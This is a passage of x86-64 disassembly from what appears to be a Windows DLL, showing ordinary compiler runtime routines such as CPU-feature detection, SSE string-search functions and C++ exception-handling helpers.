   180001d17:	c7 05 2f 83 01 00 02 	movl   $0x2,0x1832f(%rip)        # 0x18001a050
   180001d1e:	00 00 00 
   180001d21:	48 89 05 40 83 01 00 	mov    %rax,0x18340(%rip)        # 0x18001a068
   180001d28:	c7 05 22 83 01 00 06 	movl   $0x6,0x18322(%rip)        # 0x18001a054
   180001d2f:	00 00 00 
   180001d32:	0f ba e7 1b          	bt     $0x1b,%edi
   180001d36:	0f 83 2c 01 00 00    	jae    0x180001e68
   180001d3c:	33 c9                	xor    %ecx,%ecx
   180001d3e:	0f 01 d0             	xgetbv
   180001d41:	48 c1 e2 20          	shl    $0x20,%rdx
   180001d45:	48 0b d0             	or     %rax,%rdx
   180001d48:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   180001d4d:	0f ba e7 1c          	bt     $0x1c,%edi
   180001d51:	0f 83 ed 00 00 00    	jae    0x180001e44
   180001d57:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180001d5c:	24 06                	and    $0x6,%al
   180001d5e:	3c 06                	cmp    $0x6,%al
   180001d60:	0f 85 de 00 00 00    	jne    0x180001e44
   180001d66:	8b 05 e8 82 01 00    	mov    0x182e8(%rip),%eax        # 0x18001a054
   180001d6c:	83 c8 08             	or     $0x8,%eax
   180001d6f:	c7 05 d7 82 01 00 03 	movl   $0x3,0x182d7(%rip)        # 0x18001a050
   180001d76:	00 00 00 
   180001d79:	89 05 d5 82 01 00    	mov    %eax,0x182d5(%rip)        # 0x18001a054
   180001d7f:	41 f6 c1 20          	test   $0x20,%r9b
   180001d83:	74 65                	je     0x180001dea
   180001d85:	83 c8 20             	or     $0x20,%eax
   180001d88:	c7 05 be 82 01 00 05 	movl   $0x5,0x182be(%rip)        # 0x18001a050
   180001d8f:	00 00 00 
   180001d92:	89 05 bc 82 01 00    	mov    %eax,0x182bc(%rip)        # 0x18001a054
   180001d98:	41 81 e1 00 00 03 d0 	and    $0xd0030000,%r9d
   180001d9f:	48 8b 05 c2 82 01 00 	mov    0x182c2(%rip),%rax        # 0x18001a068
   180001da6:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   180001daa:	48 89 05 b7 82 01 00 	mov    %rax,0x182b7(%rip)        # 0x18001a068
   180001db1:	41 81 f9 00 00 03 d0 	cmp    $0xd0030000,%r9d
   180001db8:	75 37                	jne    0x180001df1
   180001dba:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180001dbf:	24 e0                	and    $0xe0,%al
   180001dc1:	3c e0                	cmp    $0xe0,%al
   180001dc3:	75 25                	jne    0x180001dea
   180001dc5:	48 8b 05 9c 82 01 00 	mov    0x1829c(%rip),%rax        # 0x18001a068
   180001dcc:	83 0d 81 82 01 00 40 	orl    $0x40,0x18281(%rip)        # 0x18001a054
   180001dd3:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180001dd7:	c7 05 6f 82 01 00 06 	movl   $0x6,0x1826f(%rip)        # 0x18001a050
   180001dde:	00 00 00 
   180001de1:	48 89 05 80 82 01 00 	mov    %rax,0x18280(%rip)        # 0x18001a068
   180001de8:	eb 07                	jmp    0x180001df1
   180001dea:	48 8b 05 77 82 01 00 	mov    0x18277(%rip),%rax        # 0x18001a068
   180001df1:	0f ba e5 17          	bt     $0x17,%ebp
   180001df5:	73 0c                	jae    0x180001e03
   180001df7:	48 0f ba f0 18       	btr    $0x18,%rax
   180001dfc:	48 89 05 65 82 01 00 	mov    %rax,0x18265(%rip)        # 0x18001a068
   180001e03:	41 0f ba e2 13       	bt     $0x13,%r10d
   180001e08:	73 3a                	jae    0x180001e44
   180001e0a:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180001e0f:	24 e0                	and    $0xe0,%al
   180001e11:	3c e0                	cmp    $0xe0,%al
   180001e13:	75 2f                	jne    0x180001e44
   180001e15:	48 8b 0d 4c 82 01 00 	mov    0x1824c(%rip),%rcx        # 0x18001a068
   180001e1c:	48 81 e1 d0 ff ff fe 	and    $0xfffffffffeffffd0,%rcx
   180001e23:	41 0f b6 c6          	movzbl %r14b,%eax
   180001e27:	89 05 e3 8c 01 00    	mov    %eax,0x18ce3(%rip)        # 0x18001ab10
   180001e2d:	48 89 0d 34 82 01 00 	mov    %rcx,0x18234(%rip)        # 0x18001a068
   180001e34:	83 f8 01             	cmp    $0x1,%eax
   180001e37:	76 0b                	jbe    0x180001e44
   180001e39:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   180001e3d:	48 89 0d 24 82 01 00 	mov    %rcx,0x18224(%rip)        # 0x18001a068
   180001e44:	41 0f ba e2 15       	bt     $0x15,%r10d
   180001e49:	73 1d                	jae    0x180001e68
   180001e4b:	40 f6 c6 01          	test   $0x1,%sil
   180001e4f:	74 17                	je     0x180001e68
   180001e51:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180001e56:	48 0f ba e0 13       	bt     $0x13,%rax
   180001e5b:	73 0b                	jae    0x180001e68
   180001e5d:	48 81 25 00 82 01 00 	andq   $0xffffffffffffff7f,0x18200(%rip)        # 0x18001a068
   180001e64:	7f ff ff ff 
   180001e68:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   180001e6d:	33 c0                	xor    %eax,%eax
   180001e6f:	48 83 c4 10          	add    $0x10,%rsp
   180001e73:	41 5e                	pop    %r14
   180001e75:	5f                   	pop    %rdi
   180001e76:	5e                   	pop    %rsi
   180001e77:	c3                   	ret
   180001e78:	cc                   	int3
   180001e79:	cc                   	int3
   180001e7a:	cc                   	int3
   180001e7b:	cc                   	int3
   180001e7c:	cc                   	int3
   180001e7d:	cc                   	int3
   180001e7e:	cc                   	int3
   180001e7f:	cc                   	int3
   180001e80:	b8 01 00 00 00       	mov    $0x1,%eax
   180001e85:	c3                   	ret
   180001e86:	cc                   	int3
   180001e87:	cc                   	int3
   180001e88:	cc                   	int3
   180001e89:	cc                   	int3
   180001e8a:	cc                   	int3
   180001e8b:	cc                   	int3
   180001e8c:	cc                   	int3
   180001e8d:	cc                   	int3
   180001e8e:	cc                   	int3
   180001e8f:	cc                   	int3
   180001e90:	33 c0                	xor    %eax,%eax
   180001e92:	39 05 b8 96 01 00    	cmp    %eax,0x196b8(%rip)        # 0x18001b550
   180001e98:	0f 95 c0             	setne  %al
   180001e9b:	c3                   	ret
   180001e9c:	cc                   	int3
   180001e9d:	cc                   	int3
   180001e9e:	cc                   	int3
   180001e9f:	cc                   	int3
   180001ea0:	48 8b c1             	mov    %rcx,%rax
   180001ea3:	84 d2                	test   %dl,%dl
   180001ea5:	75 46                	jne    0x180001eed
   180001ea7:	48 8b d1             	mov    %rcx,%rdx
   180001eaa:	83 e0 0f             	and    $0xf,%eax
   180001ead:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   180001eb1:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001eb4:	8b c8                	mov    %eax,%ecx
   180001eb6:	41 bb ff ff ff ff    	mov    $0xffffffff,%r11d
   180001ebc:	41 d3 e3             	shl    %cl,%r11d
   180001ebf:	66 0f 74 02          	pcmpeqb (%rdx),%xmm0
   180001ec3:	66 44 0f d7 c0       	pmovmskb %xmm0,%r8d
   180001ec8:	45 23 c3             	and    %r11d,%r8d
   180001ecb:	75 18                	jne    0x180001ee5
   180001ecd:	0f 1f 00             	nopl   (%rax)
   180001ed0:	48 83 c2 10          	add    $0x10,%rdx
   180001ed4:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001ed7:	66 0f 74 02          	pcmpeqb (%rdx),%xmm0
   180001edb:	66 44 0f d7 c0       	pmovmskb %xmm0,%r8d
   180001ee0:	45 85 c0             	test   %r8d,%r8d
   180001ee3:	74 eb                	je     0x180001ed0
   180001ee5:	41 0f bc c0          	bsf    %r8d,%eax
   180001ee9:	48 03 c2             	add    %rdx,%rax
   180001eec:	c3                   	ret
   180001eed:	45 33 c0             	xor    %r8d,%r8d
   180001ef0:	83 3d 59 81 01 00 02 	cmpl   $0x2,0x18159(%rip)        # 0x18001a050
   180001ef7:	0f 8d 9f 00 00 00    	jge    0x180001f9c
   180001efd:	0f b6 ca             	movzbl %dl,%ecx
   180001f00:	4c 8b c8             	mov    %rax,%r9
   180001f03:	83 e0 0f             	and    $0xf,%eax
   180001f06:	8b d1                	mov    %ecx,%edx
   180001f08:	c1 e2 08             	shl    $0x8,%edx
   180001f0b:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   180001f0f:	0b d1                	or     %ecx,%edx
   180001f11:	0f 57 db             	xorps  %xmm3,%xmm3
   180001f14:	8b c8                	mov    %eax,%ecx
   180001f16:	41 bb ff ff ff ff    	mov    $0xffffffff,%r11d
   180001f1c:	41 d3 e3             	shl    %cl,%r11d
   180001f1f:	f3 41 0f 6f 11       	movdqu (%r9),%xmm2
   180001f24:	66 0f 6e c2          	movd   %edx,%xmm0
   180001f28:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   180001f2d:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   180001f31:	66 0f 70 e1 00       	pshufd $0x0,%xmm1,%xmm4
   180001f36:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   180001f3a:	66 0f 74 d4          	pcmpeqb %xmm4,%xmm2
   180001f3e:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   180001f42:	66 44 0f d7 d2       	pmovmskb %xmm2,%r10d
   180001f47:	45 23 d3             	and    %r11d,%r10d
   180001f4a:	41 23 c3             	and    %r11d,%eax
   180001f4d:	75 32                	jne    0x180001f81
   180001f4f:	90                   	nop
   180001f50:	f3 41 0f 6f 49 10    	movdqu 0x10(%r9),%xmm1
   180001f56:	41 0f bd ca          	bsr    %r10d,%ecx
   180001f5a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180001f5e:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
   180001f62:	49 03 c9             	add    %r9,%rcx
   180001f65:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   180001f69:	45 85 d2             	test   %r10d,%r10d
   180001f6c:	66 0f 74 c4          	pcmpeqb %xmm4,%xmm0
   180001f70:	66 44 0f d7 d0       	pmovmskb %xmm0,%r10d
   180001f75:	4c 0f 45 c1          	cmovne %rcx,%r8
   180001f79:	49 83 c1 10          	add    $0x10,%r9
   180001f7d:	85 c0                	test   %eax,%eax
   180001f7f:	74 cf                	je     0x180001f50
   180001f81:	8b d0                	mov    %eax,%edx
   180001f83:	f7 da                	neg    %edx
   180001f85:	23 d0                	and    %eax,%edx
   180001f87:	ff ca                	dec    %edx
   180001f89:	41 23 d2             	and    %r10d,%edx
   180001f8c:	0f bd ca             	bsr    %edx,%ecx
   180001f8f:	49 03 c9             	add    %r9,%rcx
   180001f92:	85 d2                	test   %edx,%edx
   180001f94:	4c 0f 45 c1          	cmovne %rcx,%r8
   180001f98:	49 8b c0             	mov    %r8,%rax
   180001f9b:	c3                   	ret
   180001f9c:	a8 0f                	test   $0xf,%al
   180001f9e:	74 14                	je     0x180001fb4
   180001fa0:	0f b6 08             	movzbl (%rax),%ecx
   180001fa3:	3a ca                	cmp    %dl,%cl
   180001fa5:	4c 0f 44 c0          	cmove  %rax,%r8
   180001fa9:	84 c9                	test   %cl,%cl
   180001fab:	74 eb                	je     0x180001f98
   180001fad:	48 ff c0             	inc    %rax
   180001fb0:	a8 0f                	test   $0xf,%al
   180001fb2:	75 ec                	jne    0x180001fa0
   180001fb4:	0f b6 ca             	movzbl %dl,%ecx
   180001fb7:	66 0f 6e c9          	movd   %ecx,%xmm1
   180001fbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001fc0:	f3 0f 6f 00          	movdqu (%rax),%xmm0
   180001fc4:	66 0f 3a 63 c8 40    	pcmpistri $0x40,%xmm0,%xmm1
   180001fca:	73 0c                	jae    0x180001fd8
   180001fcc:	4c 63 c1             	movslq %ecx,%r8
   180001fcf:	4c 03 c0             	add    %rax,%r8
   180001fd2:	66 0f 3a 63 c8 40    	pcmpistri $0x40,%xmm0,%xmm1
   180001fd8:	74 be                	je     0x180001f98
   180001fda:	48 83 c0 10          	add    $0x10,%rax
   180001fde:	eb e0                	jmp    0x180001fc0
   180001fe0:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180001fe5:	53                   	push   %rbx
   180001fe6:	55                   	push   %rbp
   180001fe7:	56                   	push   %rsi
   180001fe8:	57                   	push   %rdi
   180001fe9:	41 54                	push   %r12
   180001feb:	41 55                	push   %r13
   180001fed:	41 56                	push   %r14
   180001fef:	41 57                	push   %r15
   180001ff1:	48 83 ec 48          	sub    $0x48,%rsp
   180001ff5:	4c 8b f1             	mov    %rcx,%r14
   180001ff8:	49 8b e9             	mov    %r9,%rbp
   180001ffb:	49 8b c8             	mov    %r8,%rcx
   180001ffe:	49 8b d8             	mov    %r8,%rbx
   180002001:	4c 8b ea             	mov    %rdx,%r13
   180002004:	e8 d7 04 00 00       	call   0x1800024e0
   180002009:	4c 8b 65 08          	mov    0x8(%rbp),%r12
   18000200d:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   180002011:	48 8b 7d 38          	mov    0x38(%rbp),%rdi
   180002015:	4d 2b fc             	sub    %r12,%r15
   180002018:	41 f6 46 04 66       	testb  $0x66,0x4(%r14)
   18000201d:	8b 75 48             	mov    0x48(%rbp),%esi
   180002020:	0f 85 eb 00 00 00    	jne    0x180002111
   180002026:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   18000202b:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180002030:	3b 37                	cmp    (%rdi),%esi
   180002032:	0f 83 ac 01 00 00    	jae    0x1800021e4
   180002038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000203f:	00 
   180002040:	8b de                	mov    %esi,%ebx
   180002042:	48 c1 e3 04          	shl    $0x4,%rbx
   180002046:	48 03 df             	add    %rdi,%rbx
   180002049:	8b 43 04             	mov    0x4(%rbx),%eax
   18000204c:	4c 3b f8             	cmp    %rax,%r15
   18000204f:	0f 82 a6 00 00 00    	jb     0x1800020fb
   180002055:	8b 43 08             	mov    0x8(%rbx),%eax
   180002058:	4c 3b f8             	cmp    %rax,%r15
   18000205b:	0f 83 9a 00 00 00    	jae    0x1800020fb
   180002061:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   180002065:	0f 84 90 00 00 00    	je     0x1800020fb
   18000206b:	8b 43 0c             	mov    0xc(%rbx),%eax
   18000206e:	83 f8 01             	cmp    $0x1,%eax
   180002071:	74 17                	je     0x18000208a
   180002073:	49 03 c4             	add    %r12,%rax
   180002076:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000207b:	49 8b d5             	mov    %r13,%rdx
   18000207e:	ff d0                	call   *%rax
   180002080:	85 c0                	test   %eax,%eax
   180002082:	0f 88 82 00 00 00    	js     0x18000210a
   180002088:	7e 71                	jle    0x1800020fb
   18000208a:	41 81 3e 63 73 6d e0 	cmpl   $0xe06d7363,(%r14)
   180002091:	75 28                	jne    0x1800020bb
   180002093:	48 83 3d 95 d2 00 00 	cmpq   $0x0,0xd295(%rip)        # 0x18000f330
   18000209a:	00 
   18000209b:	74 1e                	je     0x1800020bb
   18000209d:	48 8d 0d 8c d2 00 00 	lea    0xd28c(%rip),%rcx        # 0x18000f330
   1800020a4:	e8 47 af 00 00       	call   0x18000cff0
   1800020a9:	85 c0                	test   %eax,%eax
   1800020ab:	74 0e                	je     0x1800020bb
   1800020ad:	ba 01 00 00 00       	mov    $0x1,%edx
   1800020b2:	49 8b ce             	mov    %r14,%rcx
   1800020b5:	ff 15 75 d2 00 00    	call   *0xd275(%rip)        # 0x18000f330
   1800020bb:	8b 4b 10             	mov    0x10(%rbx),%ecx
   1800020be:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800020c4:	49 03 cc             	add    %r12,%rcx
   1800020c7:	49 8b d5             	mov    %r13,%rdx
   1800020ca:	e8 d1 03 00 00       	call   0x1800024a0
   1800020cf:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1800020d3:	4d 8b c6             	mov    %r14,%r8
   1800020d6:	8b 53 10             	mov    0x10(%rbx),%edx
   1800020d9:	49 8b cd             	mov    %r13,%rcx
   1800020dc:	45 8b 0e             	mov    (%r14),%r9d
   1800020df:	49 03 d4             	add    %r12,%rdx
   1800020e2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800020e7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1800020eb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800020f0:	ff 15 6a cf 00 00    	call   *0xcf6a(%rip)        # 0x18000f060
   1800020f6:	e8 d5 03 00 00       	call   0x1800024d0
   1800020fb:	ff c6                	inc    %esi
   1800020fd:	3b 37                	cmp    (%rdi),%esi
   1800020ff:	0f 82 3b ff ff ff    	jb     0x180002040
   180002105:	e9 da 00 00 00       	jmp    0x1800021e4
   18000210a:	33 c0                	xor    %eax,%eax
   18000210c:	e9 d8 00 00 00       	jmp    0x1800021e9
   180002111:	44 8b 07             	mov    (%rdi),%r8d
   180002114:	41 3b f0             	cmp    %r8d,%esi
   180002117:	0f 83 c7 00 00 00    	jae    0x1800021e4
   18000211d:	48 8b 5d 20          	mov    0x20(%rbp),%rbx
   180002121:	49 2b dc             	sub    %r12,%rbx
   180002124:	0f 1f 40 00          	nopl   0x0(%rax)
   180002128:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000212f:	00 
   180002130:	8b ce                	mov    %esi,%ecx
   180002132:	48 03 c9             	add    %rcx,%rcx
   180002135:	8b 44 cf 04          	mov    0x4(%rdi,%rcx,8),%eax
   180002139:	4c 8d 1c cf          	lea    (%rdi,%rcx,8),%r11
   18000213d:	4c 3b f8             	cmp    %rax,%r15
   180002140:	0f 82 90 00 00 00    	jb     0x1800021d6
   180002146:	41 8b 43 08          	mov    0x8(%r11),%eax
   18000214a:	4c 3b f8             	cmp    %rax,%r15
   18000214d:	0f 83 83 00 00 00    	jae    0x1800021d6
   180002153:	41 8b 6e 04          	mov    0x4(%r14),%ebp
   180002157:	83 e5 20             	and    $0x20,%ebp
   18000215a:	74 4a                	je     0x1800021a6
   18000215c:	33 d2                	xor    %edx,%edx
   18000215e:	45 85 c0             	test   %r8d,%r8d
   180002161:	74 3f                	je     0x1800021a2
   180002163:	4c 8d 0c cf          	lea    (%rdi,%rcx,8),%r9
   180002167:	4c 8d 14 cf          	lea    (%rdi,%rcx,8),%r10
   18000216b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002170:	8b ca                	mov    %edx,%ecx
   180002172:	48 03 c9             	add    %rcx,%rcx
   180002175:	8b 44 cf 04          	mov    0x4(%rdi,%rcx,8),%eax
   180002179:	48 3b d8             	cmp    %rax,%rbx
   18000217c:	72 1d                	jb     0x18000219b
   18000217e:	8b 44 cf 08          	mov    0x8(%rdi,%rcx,8),%eax
   180002182:	48 3b d8             	cmp    %rax,%rbx
   180002185:	73 14                	jae    0x18000219b
   180002187:	41 8b 41 10          	mov    0x10(%r9),%eax
   18000218b:	39 44 cf 10          	cmp    %eax,0x10(%rdi,%rcx,8)
   18000218f:	75 0a                	jne    0x18000219b
   180002191:	41 8b 42 0c          	mov    0xc(%r10),%eax
   180002195:	39 44 cf 0c          	cmp    %eax,0xc(%rdi,%rcx,8)
   180002199:	74 07                	je     0x1800021a2
   18000219b:	ff c2                	inc    %edx
   18000219d:	41 3b d0             	cmp    %r8d,%edx
   1800021a0:	72 ce                	jb     0x180002170
   1800021a2:	3b 17                	cmp    (%rdi),%edx
   1800021a4:	75 3e                	jne    0x1800021e4
   1800021a6:	41 8b 43 10          	mov    0x10(%r11),%eax
   1800021aa:	85 c0                	test   %eax,%eax
   1800021ac:	74 0b                	je     0x1800021b9
   1800021ae:	48 3b d8             	cmp    %rax,%rbx
   1800021b1:	75 23                	jne    0x1800021d6
   1800021b3:	85 ed                	test   %ebp,%ebp
   1800021b5:	75 2d                	jne    0x1800021e4
   1800021b7:	eb 1d                	jmp    0x1800021d6
   1800021b9:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   1800021c0:	00 
   1800021c1:	8d 46 01             	lea    0x1(%rsi),%eax
   1800021c4:	49 8b d5             	mov    %r13,%rdx
   1800021c7:	89 41 48             	mov    %eax,0x48(%rcx)
   1800021ca:	b1 01                	mov    $0x1,%cl
   1800021cc:	45 8b 43 0c          	mov    0xc(%r11),%r8d
   1800021d0:	4d 03 c4             	add    %r12,%r8
   1800021d3:	41 ff d0             	call   *%r8
   1800021d6:	44 8b 07             	mov    (%rdi),%r8d
   1800021d9:	ff c6                	inc    %esi
   1800021db:	41 3b f0             	cmp    %r8d,%esi
   1800021de:	0f 82 4c ff ff ff    	jb     0x180002130
   1800021e4:	b8 01 00 00 00       	mov    $0x1,%eax
   1800021e9:	48 83 c4 48          	add    $0x48,%rsp
   1800021ed:	41 5f                	pop    %r15
   1800021ef:	41 5e                	pop    %r14
   1800021f1:	41 5d                	pop    %r13
   1800021f3:	41 5c                	pop    %r12
   1800021f5:	5f                   	pop    %rdi
   1800021f6:	5e                   	pop    %rsi
   1800021f7:	5d                   	pop    %rbp
   1800021f8:	5b                   	pop    %rbx
   1800021f9:	c3                   	ret
   1800021fa:	cc                   	int3
   1800021fb:	cc                   	int3
   1800021fc:	cc                   	int3
   1800021fd:	cc                   	int3
   1800021fe:	cc                   	int3
   1800021ff:	cc                   	int3
   180002200:	48 3b ca             	cmp    %rdx,%rcx
   180002203:	74 1a                	je     0x18000221f
   180002205:	48 83 c2 09          	add    $0x9,%rdx
   180002209:	48 8d 41 09          	lea    0x9(%rcx),%rax
   18000220d:	48 2b d0             	sub    %rax,%rdx
   180002210:	0f b6 08             	movzbl (%rax),%ecx
   180002213:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   180002216:	75 0a                	jne    0x180002222
   180002218:	48 ff c0             	inc    %rax
   18000221b:	84 c9                	test   %cl,%cl
   18000221d:	75 f1                	jne    0x180002210
   18000221f:	33 c0                	xor    %eax,%eax
   180002221:	c3                   	ret
   180002222:	1b c0                	sbb    %eax,%eax
   180002224:	83 c8 01             	or     $0x1,%eax
   180002227:	c3                   	ret
   180002228:	cc                   	int3
   180002229:	cc                   	int3
   18000222a:	cc                   	int3
   18000222b:	cc                   	int3
   18000222c:	cc                   	int3
   18000222d:	cc                   	int3
   18000222e:	cc                   	int3
   18000222f:	cc                   	int3
   180002230:	48 83 ec 28          	sub    $0x28,%rsp
   180002234:	ff 15 2e ce 00 00    	call   *0xce2e(%rip)        # 0x18000f068
   18000223a:	48 85 c0             	test   %rax,%rax
   18000223d:	74 1d                	je     0x18000225c
   18000223f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002244:	48 8b 18             	mov    (%rax),%rbx
   180002247:	48 8b c8             	mov    %rax,%rcx
   18000224a:	e8 81 37 00 00       	call   0x1800059d0
   18000224f:	48 8b c3             	mov    %rbx,%rax
   180002252:	48 85 db             	test   %rbx,%rbx
   180002255:	75 ed                	jne    0x180002244
   180002257:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   18000225c:	48 83 c4 28          	add    $0x28,%rsp
   180002260:	c3                   	ret
   180002261:	cc                   	int3
   180002262:	cc                   	int3
   180002263:	cc                   	int3
   180002264:	cc                   	int3
   180002265:	cc                   	int3
   180002266:	cc                   	int3
   180002267:	cc                   	int3
   180002268:	cc                   	int3
   180002269:	cc                   	int3
   18000226a:	cc                   	int3
   18000226b:	cc                   	int3
   18000226c:	cc                   	int3
   18000226d:	cc                   	int3
   18000226e:	cc                   	int3
   18000226f:	cc                   	int3
   180002270:	48 83 ec 28          	sub    $0x28,%rsp
   180002274:	e8 87 05 00 00       	call   0x180002800
   180002279:	84 c0                	test   %al,%al
   18000227b:	74 0e                	je     0x18000228b
   18000227d:	e8 de 04 00 00       	call   0x180002760
   180002282:	84 c0                	test   %al,%al
   180002284:	75 0c                	jne    0x180002292
   180002286:	e8 05 06 00 00       	call   0x180002890
   18000228b:	32 c0                	xor    %al,%al
   18000228d:	48 83 c4 28          	add    $0x28,%rsp
   180002291:	c3                   	ret
   180002292:	b0 01                	mov    $0x1,%al
   180002294:	48 83 c4 28          	add    $0x28,%rsp
   180002298:	c3                   	ret
   180002299:	cc                   	int3
   18000229a:	cc                   	int3
   18000229b:	cc                   	int3
   18000229c:	cc                   	int3
   18000229d:	cc                   	int3
   18000229e:	cc                   	int3
   18000229f:	cc                   	int3
   1800022a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800022a4:	e8 d7 03 00 00       	call   0x180002680
   1800022a9:	48 85 c0             	test   %rax,%rax
   1800022ac:	0f 95 c0             	setne  %al
   1800022af:	48 83 c4 28          	add    $0x28,%rsp
   1800022b3:	c3                   	ret
   1800022b4:	cc                   	int3
   1800022b5:	cc                   	int3
   1800022b6:	cc                   	int3
   1800022b7:	cc                   	int3
   1800022b8:	cc                   	int3
   1800022b9:	cc                   	int3
   1800022ba:	cc                   	int3
   1800022bb:	cc                   	int3
   1800022bc:	cc                   	int3
   1800022bd:	cc                   	int3
   1800022be:	cc                   	int3
   1800022bf:	cc                   	int3
   1800022c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800022c4:	e8 77 02 00 00       	call   0x180002540
   1800022c9:	b0 01                	mov    $0x1,%al
   1800022cb:	48 83 c4 28          	add    $0x28,%rsp
   1800022cf:	c3                   	ret
   1800022d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800022d4:	84 c9                	test   %cl,%cl
   1800022d6:	75 0a                	jne    0x1800022e2
   1800022d8:	e8 f3 04 00 00       	call   0x1800027d0
   1800022dd:	e8 ae 05 00 00       	call   0x180002890
   1800022e2:	b0 01                	mov    $0x1,%al
   1800022e4:	48 83 c4 28          	add    $0x28,%rsp
   1800022e8:	c3                   	ret
   1800022e9:	cc                   	int3
   1800022ea:	cc                   	int3
   1800022eb:	cc                   	int3
   1800022ec:	cc                   	int3
   1800022ed:	cc                   	int3
   1800022ee:	cc                   	int3
   1800022ef:	cc                   	int3
   1800022f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800022f4:	e8 d7 04 00 00       	call   0x1800027d0
   1800022f9:	b0 01                	mov    $0x1,%al
   1800022fb:	48 83 c4 28          	add    $0x28,%rsp
   1800022ff:	c3                   	ret
   180002300:	48 85 c9             	test   %rcx,%rcx
   180002303:	74 67                	je     0x18000236c
   180002305:	88 54 24 10          	mov    %dl,0x10(%rsp)
   180002309:	48 83 ec 48          	sub    $0x48,%rsp
   18000230d:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   180002313:	75 53                	jne    0x180002368
   180002315:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   180002319:	75 4d                	jne    0x180002368
   18000231b:	8b 41 20             	mov    0x20(%rcx),%eax
   18000231e:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180002323:	83 f8 02             	cmp    $0x2,%eax
   180002326:	77 40                	ja     0x180002368
   180002328:	48 8b 41 30          	mov    0x30(%rcx),%rax
   18000232c:	48 85 c0             	test   %rax,%rax
   18000232f:	74 37                	je     0x180002368
   180002331:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180002335:	85 d2                	test   %edx,%edx
   180002337:	74 11                	je     0x18000234a
   180002339:	48 03 51 38          	add    0x38(%rcx),%rdx
   18000233d:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   180002341:	e8 2a 00 00 00       	call   0x180002370
   180002346:	eb 20                	jmp    0x180002368
   180002348:	eb 1e                	jmp    0x180002368
   18000234a:	f6 00 10             	testb  $0x10,(%rax)
   18000234d:	74 19                	je     0x180002368
   18000234f:	48 8b 41 28          	mov    0x28(%rcx),%rax
   180002353:	48 8b 08             	mov    (%rax),%rcx
   180002356:	48 85 c9             	test   %rcx,%rcx
   180002359:	74 0d                	je     0x180002368
   18000235b:	48 8b 01             	mov    (%rcx),%rax
   18000235e:	48 8b 40 10          	mov    0x10(%rax),%rax
   180002362:	ff 15 f0 ce 00 00    	call   *0xcef0(%rip)        # 0x18000f258
   180002368:	48 83 c4 48          	add    $0x48,%rsp
   18000236c:	c3                   	ret
   18000236d:	cc                   	int3
   18000236e:	cc                   	int3
   18000236f:	cc                   	int3
   180002370:	48 ff e2             	rex.W jmp *%rdx
   180002373:	cc                   	int3
   180002374:	cc                   	int3
   180002375:	cc                   	int3
   180002376:	cc                   	int3
   180002377:	cc                   	int3
   180002378:	cc                   	int3
   180002379:	cc                   	int3
   18000237a:	cc                   	int3
   18000237b:	cc                   	int3
   18000237c:	cc                   	int3
   18000237d:	cc                   	int3
   18000237e:	cc                   	int3
   18000237f:	cc                   	int3
   180002380:	40 53                	rex push %rbx
   180002382:	48 83 ec 20          	sub    $0x20,%rsp
   180002386:	48 8b d9             	mov    %rcx,%rbx
   180002389:	e8 12 02 00 00       	call   0x1800025a0
   18000238e:	48 8b 40 58          	mov    0x58(%rax),%rax
   180002392:	48 85 c0             	test   %rax,%rax
   180002395:	74 0e                	je     0x1800023a5
   180002397:	48 39 18             	cmp    %rbx,(%rax)
   18000239a:	74 14                	je     0x1800023b0
   18000239c:	48 8b 40 08          	mov    0x8(%rax),%rax
   1800023a0:	48 85 c0             	test   %rax,%rax
   1800023a3:	75 f2                	jne    0x180002397
   1800023a5:	b8 01 00 00 00       	mov    $0x1,%eax
   1800023aa:	48 83 c4 20          	add    $0x20,%rsp
   1800023ae:	5b                   	pop    %rbx
   1800023af:	c3                   	ret
   1800023b0:	33 c0                	xor    %eax,%eax
   1800023b2:	48 83 c4 20          	add    $0x20,%rsp
   1800023b6:	5b                   	pop    %rbx
   1800023b7:	c3                   	ret
   1800023b8:	cc                   	int3
